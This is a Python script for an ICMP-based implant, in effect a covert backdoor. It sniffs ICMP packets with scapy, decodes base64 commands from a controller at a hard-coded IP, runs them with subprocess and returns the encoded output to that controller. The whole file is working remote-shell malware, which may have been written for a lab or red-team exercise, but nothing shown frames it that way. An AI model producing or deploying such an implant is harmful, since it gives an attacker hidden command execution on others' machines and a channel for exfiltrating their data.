#!/usr/bin/python3

from scapy.all import sr,IP,ICMP,Raw,sniff
import base64
from shellylib import Host
from subprocess import STDOUT, check_output, TimeoutExpired

ICMP_ID = int(12800)
TTL = int(64)

class Implant(Host):
    
    def __init__(self, controller_ip):
        super().__init__()
        self.controller_ip = controller_ip

    def join(self, shellpack):
        self.send(shellpack['ip'], "join")

    def instruction(self, shellpack):
        if shellpack['message'] != 'request':
            raise Exception
        try:
            cmd = base64.b64decode(shellpack['data'].decode()).decode()
            cmd = cmd.split(" ")
            output = check_output(cmd, stderr=STDOUT, timeout=3)
            output = base64.b64encode(output)
            
            self.send(self.controller_ip, "instruction", output)
        except TimeoutExpired:
            raise Exception

if __name__ == "__main__":
    print("[ Setting up implant... ]")
    print("[ ICMP Sniffing Started ]")
    
    implant = Implant(controller_ip="192.168.157.6")
    print(implant)

    print("[ Shellpack log ]")
    # Send join command
    implant.send(implant.controller_ip, "join")

    # Start sniffing
    sniff(iface=implant.iface, prn=implant.sniff_callback, filter="icmp", store="0")
